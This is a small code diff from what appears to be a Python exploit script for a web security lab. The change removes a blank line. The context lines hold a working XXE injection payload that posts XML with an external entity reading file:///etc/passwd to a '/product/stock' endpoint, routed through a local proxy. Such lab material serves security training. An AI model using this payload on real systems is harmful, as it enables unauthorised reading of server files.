@@ -26,7 +26,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def exploit_xxe(s, url):
-
     print("(+) Exploiting XXE Injection...")
     stock_url = url + '/product/stock'
     data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
